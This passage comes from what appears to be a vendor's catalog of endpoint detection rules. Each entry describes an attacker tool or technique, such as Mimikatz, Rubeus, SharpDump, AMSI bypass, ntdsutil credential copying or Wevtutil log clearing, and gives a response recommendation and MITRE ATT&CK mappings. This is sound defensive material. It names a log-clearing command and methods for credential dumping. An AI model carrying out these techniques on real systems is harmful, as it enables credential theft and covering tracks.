- Signed Binary Proxy Execution - T1218
- Regsvcs/Regasm - T1218.009
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - Mimipenguin</summary>



#### Description

This detection identifies the use of the tool Mimipenguin by a malicious actor or penetration tester in the environment. Mimipenguin dumps the login password from the current Linux desktop user. This technique is used by malicious actors and penetration testers to take advantage of cleartext credentials in memory by dumping the process and extracting lines that have a high probability of containing cleartext passwords.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- Proc Filesystem - T1003.007
- /etc/passwd and /etc/shadow - T1003.008
- Command and Scripting Interpreter - T1059
- Python - T1059.006
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - MSF.exe</summary>



#### Description

This detection identifies binaries executing named MSF.exe, a default name for binaries generated by the Metasploit Framework

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine anything that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - MSOffice-Crypt</summary>



#### Description

This detection identifies the execution of the tool 'msoffice-crypt.exe'. This tool is used by malicious actors to encrypt the contents of files generated by Microsoft Office applications to ransom the encrypted file contents.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Data Encrypted for Impact - T1486
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - NetScanTools</summary>



#### Description

This detection identifies NetScanTools being executed, which is a collection of various network enumeration and mapping utilities. This tool is used by penetration testers and malicious actors to map out networks and services,post compromise.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Network Service Scanning - T1046


</details>



<details>
<summary>Attacker Tool - New-GPOImmediateTask</summary>



#### Description

This detection identifies use of the PowerShell Empire New-GPOImmediateTask module. A malicious actor may use this to create a change to Group Policy which will push out a new scheduled task to other systems which will execute immediately and run arbitrary commands of the malicious actor's choosing. 

#### Recommendation

Investigate the scheduled task that was created. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Group Policy Modification - T1484.001


</details>



<details>
<summary>Attacker Tool - Nishang Functions</summary>



#### Description

This detection identifies functions that are part of the Nishang framework. Nishang is a powerful exploitation and c2 framework built in PowerShell. 

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Tool - Ophcrack</summary>



#### Description

This detection identifies the use of the password dumping and cracking tool Ophcrack.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. Determine if this was behavior was part of any authorized security-related activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- Password Cracking - T1110.002


</details>



<details>
<summary>Attacker Tool - Password Recovery Pro</summary>



#### Description

This detection identifies the use of XenArmor Password Recovery Pro. This command-line tool is used for recovering passwords from various local applications including, but not limited to, Remote Desktop, VPN, email, and web browsers.

#### Recommendation

Determine whether this tool was used as part of authorized testing or administrator activity. Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Credentials from Password Stores - T1555


</details>



<details>
<summary>Attacker Tool - PetitPotam Tool</summary>



#### Description

This detection identifies the use of the PetitPotam tool. This tool is a PoC of an exploit that will cause a Windows host to authenticate to other machines.

#### Recommendation

Determine whether this is part of authorized testing. If this is not expected activity, determine any other hosts that this host may have authenticated to and consider rebuilding them from a known-good configuration. See this Microsoft advisory for more detail on mitigating PetitPotam: https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429

#### MITRE ATT&CK Techniques

- Adversary-in-the-Middle - T1557


</details>



<details>
<summary>Attacker Tool - PowerCat</summary>



#### Description

This detection identifies the download or use of the PowerCat PowerShell function. PowerCat is a PowerShell-based implementation of NetCat, a utility for reading and writing data across network connections.

#### Recommendation

Determine whether this is part of authorized administrator activity.  Investigate any IP addresses being contacted. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - PowerLine</summary>



#### Description

This detection identifies ‘PowerLine.exe’ being used based on process name and metadata. Penetration testers and malicious actors use this tool to compile all the desired PowerShell scripts and tools into a single binary.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Tool - PowerLsassSilentProcessExit</summary>



#### Description

This detection identifies the use of the Powershell tool known as 'PowerLsassSilentProcessExit'. This tool is used by malicious actors and pentesters to dump the contents of the 'lsass.exe' process memory to disk in order to retrieve credentials.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001
- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Tool - PowerLurk</summary>



#### Description

This detection identifies functions related to PowerLurk. PowerLurk is a PowerShell-based tool for creating malicious WMI Events. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047
- Windows Management Instrumentation Event Subscription - T1546.003


</details>



<details>
<summary>Attacker Tool - PowerSharpPack</summary>



#### Description

This detection identifies use of the PowerSharpPack toolset for PowerShell. PowerSharpPack implements several popular C#-based penetration testing utilities in PowerShell. The full list of utilities implemented in PowerSharpPack is as follows:
Internalmonologue, Seatbelt, SharpWeb, UrbanBishop, SharpUp, Rubeus, SharPersist, Sharpview, winPEAS, Lockless, SharpChromium, SharpDPAPI, SharpShares, SharpSniper, SharpSpray, Watson, Grouper2, SauronEye

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Tool - PowerShell Empire Command Line Flags</summary>



#### Description

This detection identifies command line flags commonly observed in PowerShell Empire activity. PowerShell Empire is a fully-featured, post-exploitation framework built in PowerShell script.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Tool - PowerShell Empire Modules</summary>



#### Description

This detection identifies PowerShell modules being run that have the same name as modules from the Empire framework. Empire is a full-featured post-exploitation  framework written in PowerShell and is often used by malicious actors. Empire is no longer supported officially, but has been forked numerous times and remains in use in the wild.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Tool - PowerShell -noni -ep -nop Flags</summary>



#### Description

This detection identifies PowerShell scripts with a certain combination of flags being executed. Malicious PowerShell scripts will often execute with two or more of the following command line flags: -noni - non-interactive -nop - no profile -ep - execution policy. These command line flags are usually followed by 'bypass'.

#### Recommendation

Inspect the executed PowerShell command and determine whether it is expected behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Tool - PowerTools Filenames</summary>



#### Description

This detection identifies the presence of PowerTools file names in the command line. This collection of tools are used by penetration testers and malicious actors to retrieve tokens, password hashes and other valuable information post compromise.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- Process Injection - T1055
- System Services - T1569
- DLL Search Order Hijacking - T1574.001


</details>



<details>
<summary>Attacker Tool - PowerUPSQL Function Name</summary>



#### Description

This detection identifies common function names from the PowerUPSQL at ‘https://github.com/NetSPI/PowerUpSQL’. PowerUpSQL includes functions that support SQL Server discovery, weak configuration auditing, privilege escalation on scale, and post exploitation actions, such as Operating System command execution.


#### Recommendation

Review the process and file in question and verify that the activity is allowed. If it is not, lock the account and delete the PowerShell scripts.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - PowerView</summary>



#### Description

This detection identifies module names for PowerView being passed to ‘PowerShell.exe’. PowerView is used by malicious actors and penetration testers to identify servers or Domain Controllers.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- System Service Discovery - T1007
- Remote System Discovery - T1018
- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- System Information Discovery - T1082
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - PrintSpoofer</summary>



#### Description

This detection identifies the use of PrintSpoofer. PrintSpoofer is a utility that is able to escalate privileges for a user on Windows 10, Windows Server 2016, and Windows Server 2019.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Privilege Escalation - T1068


</details>



<details>
<summary>Attacker Tool - PSAttack</summary>



#### Description

This detection identifies PSAttack being executed. Penetration testers and malicious actors use this tool to their PowerShell based scripts and tools into a single binary.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Tool - PSR screenshot tool</summary>



#### Description

This detection identifies the use of the Problem Step Recorder screenshot utility, a legitimate utility that has been abused by attackers for screen capture. 

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Screen Capture - T1113


</details>



<details>
<summary>Attacker Tool - PWDump</summary>



#### Description

This detection identifies PWDump being executed. Penetration testers and malicious actors use this tool to collect password hashes from a system, post compromise.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003


</details>



<details>
<summary>Attacker Tool - PXE and Loot</summary>



#### Description

This detection identifies payloads generated with PXE And Loot (PAX), which is used to gather information from misconfigured Windows Deployment Services. PAX is a tool that was stolen by a malicious actor from FireEye.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Credential Access - T1212


</details>



<details>
<summary>Attacker Tool - RottenPotato</summary>



#### Description

This detection identifies theRottenPotato tool being used by a malicious actor or penetration tester in the environment. RottenPotato is a tool used to perform privilege escalation on vulnerable Windows systems.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Privilege Escalation - T1068


</details>



<details>
<summary>Attacker Tool - Rubeus</summary>



#### Description

This detection identifies common command line flags for Rubeus. Malicious actors use Rubeus for Kerberos testing and abuse.


#### Recommendation

Determine whether the user is authorized to perform Kerberos testing. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Pass the Hash - T1550.002
- Steal or Forge Kerberos Tickets - T1558
- Kerberoasting - T1558.003
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - RuralBishop</summary>



#### Description

This detection identifies that the ‘RuralBishop.exe' tool has been used by a malicious actor or penetration tester in the environment. RuralBishop is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - SafetyDump</summary>



#### Description

This detection identifies that the ‘SafetyDump.exe' tool has been used by a malicious actor or penetration tester in the environment. SafetyDump is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - SafetyKatz</summary>



#### Description

This detection identifies that the 'SafetyKatz.exe' tool has been used by a malicious actor or penetration tester in the environment. SafetyKatz is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - Seatbelt</summary>



#### Description

This detection identifies that the ‘Seatbelt.exe' tool has been used by a malicious actor or penetration tester in the environment. Seatbelt is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - SecretsDump Flags</summary>



#### Description

This detection identifies unique flags that are passed to the tool known as 'secretsdump.py'. This tool is used by malicious actors and penetration testers in order to retrieve credentials from the system.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003


</details>



<details>
<summary>Attacker Tool - SecurityXploded</summary>



#### Description

This detection identifies the use of SecurityXploded tools. SecurityXploded is a developer of password recovery tools that can be abused by a malicious actor to steal credentials.

#### Recommendation

Determine whether the user is authorized to perform this activity. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- Credentials from Password Stores - T1555


</details>



<details>
<summary>Attacker Tool - SharpBlock</summary>



#### Description

This detection identifies the use of SharpBlock. SharpBlock is a PowerShell framework for disabling and bypassing EDRs and AMSI. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Attacker Tool - SharpDump</summary>



#### Description

This detection identifies the use of SharpDump. SharpDump is a tool used for dumping process memory to a file. From SharpDump's GitHub page:
"SharpDump is a C# port of PowerSploit's Out-Minidump.ps1 functionality. The MiniDumpWriteDump Win32 API call is used to create a minidump for the process ID specified (LSASS by default) to C:\Windows\Temp\debug.out, GZipStream is used to compress the dump to C:\Windows\Temp\debug.bin (.gz format), and the original minidump file is deleted."

#### Recommendation

Determine whether the user is authorized to perform this activity. If necessary, rebuild the host from a known, good source and change the passwords of all users on the system.

#### MITRE ATT&CK Techniques

- LSASS Memory - T1003.001


</details>



<details>
<summary>Attacker Tool - SharPersist</summary>



#### Description

This detection identifies that the ‘SharPersist.exe' tool has been used by a malicious actor or penetration tester in the environment. SharPersist is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - SharpHound</summary>



#### Description

This detection identifies that the tool ‘SharpHound.exe' has been used by a malicious actor or penetration tester in the environment. SharpHound is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password. 


#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - SharPivot</summary>



#### Description

This detection identifies command line arguments consistent with SharPivot, a tool for executing lateral movement commands.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Distributed Component Object Model - T1021.003
- Windows Command Shell - T1059.003
- Component Object Model - T1559.001


</details>



<details>
<summary>Attacker Tool - SharpStomp</summary>



#### Description

This detection identifies SharpStomp, a utility that can be used for timestomping files.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Timestomp - T1070.006


</details>



<details>
<summary>Attacker Tool - SharpView</summary>



#### Description

This detection identifies that the ‘SharpView.exe' tool has been used by a malicious actor or penetration tester in the environment. SharpView is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - SharpZeroLogon</summary>



#### Description

This detection identifies that the ‘SharpZeroLogon.exe' tool has been used by a malicious actor or penetration tester in the environment. SharpZeroLogon is a tool that was stolen from FireEye by a malicious actor.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - SMBMap</summary>



#### Description

This detection identifies the use of the SMBMap tool. SMBMap allows users to enumerate SMB share drives across an entire domain. Malicious actors may use this in order to move laterally. 

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Remote System Discovery - T1018


</details>



<details>
<summary>Attacker Tool - SoftPerfect Network Scanner</summary>



#### Description

This detection identifies use of the SoftPerfect Network Scanner utility. This is a legitimate tool that is used by malicious actors to scan networks for potential lateral movement targets. 

#### Recommendation

Determine whether this activity is part of authorized use of Network Scanner. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Remote System Discovery - T1018


</details>



<details>
<summary>Attacker Tool - Spraykatz</summary>



#### Description

This detection identifies Spraykatz. It can be used by malicious actor to retrieve credentials on Windows machines and large Active Directory environments remotely using Procdump. 



#### Recommendation

Examine the parent process that spawned the process in question. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003


</details>



<details>
<summary>Attacker Tool - TargetIP Flag</summary>



#### Description

This detection identifies processes being executed with the flag ‘--TargetIp’. This flag is passed to tools used by malicious actors that have been associated with the EternalBlue exploit against vulnerable Windows systems.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Client Execution - T1203


</details>



<details>
<summary>Attacker Tool - Teramind Agent Connection To Router</summary>



#### Description

This detection identifies the use of Teramind Agent's remote access monitoring software being executed and connecting to a '--router=' where the value is not an internal IP address. This legitimate tool is used by malicious actors post compromise in order to remote control systems.

#### Recommendation

Review the alert in question and determine if the '--router=' value in the command line is legitimate. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Remote Access Software - T1219


</details>



<details>
<summary>Attacker Tool - WGet.vbs</summary>



#### Description

This detection identifies ‘wget.vbs’ being executed, which isa tool for sending HTTP GET requests that are similar to the WGet utility, but implemented in VB Script. Malicious actors use ‘wget.vbs’ to download second stage payloads.

#### Recommendation

Investigate the URL downloaded via WGet, and any files it writes if they are still on disk. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Visual Basic - T1059.005
- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Attacker Tool - Windows Credential Editor</summary>



#### Description

This detection identifies the execution of file names associated with the Windows Credential Editor utility. This tool is used by malicious actors and penetration testers to modify a user's credentials.

#### Recommendation

Review the process execution history for the host to find any other attacker related activity.Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Account Manipulation - T1098
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - Windows Credential Editor Changing Users Password</summary>



#### Description

This detection identifies the structure of commands executed while running the Windows Credential Editor program. These commands allow a malicious actor to change the password of a user on the endpoint and take over the user’s account.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Account Manipulation - T1098
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Attacker Tool - ZipExec</summary>



#### Description

This detection identifies execution of files created by ZipExec. ZipExec is tool that wraps binary-based tools into a password-protected zip file in order to evade EDR detection. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Component Object Model - T1559.001


</details>



<details>
<summary>Bitcoin Miner - CPUMiner</summary>



#### Description

This detection identifies the command line including the string ‘CPUminer’. ‘CPUminer’ is a command line BitCoin miner often deployed by malicious actors. 


#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Resource Hijacking - T1496


</details>



<details>
<summary>Bitcoin Miner - Cryptonight Algorithm In Command Line</summary>



#### Description

This detection identifies Bitcoin miners by using the stratum mining protocol being passed as the ‘cryptonight’ argument to the binary. Bitcoin miners are dropped by malicious actors to monetize the resources of exploited endpoints.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Resource Hijacking - T1496


</details>



<details>
<summary>Bitcoin Miner - MinerD Process Name</summary>



#### Description

This detection identifies the use of processes named ‘MinerD.exe’, which indicates the presence of cryptocurrency miners.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Resource Hijacking - T1496


</details>



<details>
<summary>Bitcoin Miner - Stratum Protocol In Command Line</summary>



#### Description

This detection identifies Bitcoin miners by using the stratum mining protocol being passed as the ‘stratum+tcp’ argument to the binary. Bitcoin miners are dropped by malicious actors to monetize the resources of exploited endpoints.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Resource Hijacking - T1496


</details>



<details>
<summary>Credential Access - Comsvc Minidump</summary>



#### Description

Identifies the comsvc dll being used to run MiniDump, often done by attackers to dump credentials.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003


</details>



<details>
<summary>Credential Access - Copying Credential Files with Esenutil</summary>



#### Description

This detection identifies the Extensible Storage Engine Utility, ‘Esenutil.exe’, which can be used to access files  on a system that would otherwise be locked and inaccessible because it is in use. This can be used by a malicious actor to copy files, such as NTDS.dit, which could contain credentials.


#### Recommendation

Determine whether the activity was authorized backup activity or other administrator activity. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- NTDS - T1003.003


</details>



<details>
<summary>Credential Access - Find Password Files via Command Line</summary>



#### Description

This detection identifies the FindStr and Dir utilities being used on Windows to search for files or directories with strings in their name that might indicate that the files are storing credentials in plain text. 

#### Recommendation

Determine if the activity is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Credentials In Files - T1552.001


</details>



<details>
<summary>Credential Access - Mimikatz Pattern in CommandLine</summary>



#### Description

This detection identifies certain command line patterns indicative of Mimikatz. Mimikatz is an open-source tool for performing a number of credential theft operations. 

#### Recommendation

Examine the command line arguments and determine if the activity is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001
- Security Account Manager - T1003.002
- LSA Secrets - T1003.004
- DCSync - T1003.006
- Credentials from Web Browsers - T1555.003
- Windows Credential Manager - T1555.004


</details>



<details>
<summary>Credential Access - ntdsutil Creating Installation Media</summary>



#### Description

This detection identifies ntdsutil, a legitimate utility from Microsoft, being used to create installation media. This creates a copy of NTDS.dit in the location specified in the command. A malicious actor can then exfiltrate this copy and dump password hashes from it.

#### Recommendation

Ensure that this behavior is part of expected backup or admin behavior. If necessary, rebuild the host from a known, good source and change the passwords of any users who may be in the NTDS.dit file.

#### MITRE ATT&CK Techniques

- NTDS - T1003.003


</details>



<details>
<summary>Credential Access - Ntdsutil Dumping Active Directory Snapshots</summary>



#### Description

This detection identifies the execution of 'NTDSUtil.exe' managing snapshots of Active Directory Database and Log files.  'NTDSUtil.exe' is a Window Server specific command-line tool that is used for managing Active Directory Domain Services. Malicious actors can use the snapshots taken during this process to exfiltrate credential data.

#### Recommendation

Ensure that this behavior is part of expected backup or admin behavior. If necessary, rebuild the host from a known, good source and change the passwords of any users who may be in the snapshots.

#### MITRE ATT&CK Techniques

- NTDS - T1003.003


</details>



<details>
<summary>Credential Access - Querying Registry for Stored Credentials</summary>



#### Description

This detection identifies ‘reg.exe’ being used to query for locations in the registry containing the string 'password'. The registry may be used by insecure programs to store credentials.

#### Recommendation

Determine if the activity is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Credentials in Registry - T1552.002


</details>



<details>
<summary>Credential Access - Renamed Comsvcs DLL Execution</summary>



#### Description

This detection identifies the execution of comsvcs.dll being copied and renamed to avoid detection and then execute from a non-standard directory. The renamed DLL is then used to access credentials.

#### Recommendation

Examine the DLL and process in question.  If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003


</details>



<details>
<summary>Credential Dumping -  Reg.exe Exporting Security, System or SAM Registry Keys</summary>



#### Description

This detection identifies the export of specific security related hives, includingSecurity, System, or SAM with the ‘Reg.exe command’. Malicious actors will do this to acquire the credentials stored in those hives.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. Determine if this is a part of authorized administrator or security activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003


</details>



<details>
<summary>Defense Evasion - Alternate Data Stream in Command Line</summary>



#### Description

This detection identifies alternate data stream files in command line arguments. Alternate data streams are a feature of the NTFS file system that was originally created for compatibility with HFS file systems. Malicious actors can use this feature to hide a file ‘behind’ another file.

#### Recommendation

Inspect the alternate data stream file. Determine if the activity is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Hide Artifacts - T1564


</details>



<details>
<summary>Defense Evasion - AMSI Bypass</summary>



#### Description

This detection identifies the use of a popular PowerShell-based bypass of the Windows Anti-Malware Scan Interface (AMSI). A malicious actor who is successfully able to bypass AMSI will be able to execute code that would otherwise be detected as malicious. 

#### Recommendation

Determine if the activity is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Defense Evasion - Applocker Bypass via MSDT.exe</summary>



#### Description

This detection identifies the Microsoft Diagnostics tool, ‘MSDT.exe’, possibly being used to proxy the execution of malicious MSI files. 'MSDT.exe' is a trusted utility and anything it executes will bypass AppLocker restrictions.


#### Recommendation

Determine if the activity is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Trusted Developer Utilities Proxy Execution - T1127
- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Defense Evasion - Base64 Encoded UserAgent</summary>



#### Description

This detection identifies common UserAgent strings encoded in base64. To blend in with other web traffic, PowerShell-based downloaders will often manually set their useragent string to something benign when downloading a payload. 

#### Recommendation

Determine if the activity is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Defense Evasion - Clearing PowerShell Logs</summary>



#### Description

This detection identifies the command "Wevtutil.exe cl Microsoft-Windows-PowerShell" being used to clear PowerShell logs.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Clear Windows Event Logs - T1070.001


</details>



<details>
<summary>Defense Evasion - Cmd.exe Case Obfuscation</summary>



#### Description

This detection identifies ‘cmd.exe’ being called with abnormal upper and lower case combinations. Malicious actors do this to attempt to evade detection based on simple case-sensitive strings.

#### Recommendation

Review the arguments being passed to ‘cmd.exe’ and the parent process. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

